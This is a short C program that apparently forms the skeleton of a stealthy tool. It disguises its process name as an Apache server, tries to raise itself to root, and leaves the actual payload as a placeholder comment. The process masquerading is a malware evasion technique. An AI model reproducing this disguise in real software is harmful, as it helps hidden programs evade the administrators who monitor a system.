#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pcap.h>

#define MASK "/usr/sbin/apache2 -k start -DSSL"

int main (int argc, char *argv[])
{
	/* Mask the process name */
	strcpy(argv[0], MASK);
	
	/* Change the UID/GID to 0 (raise to root) */
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        printf("error in getting root, try another method?");
        return 1;
    }
	setgid(0);

	/* Call the rest of the code */
    
    /* Exit */
    return 0;
}
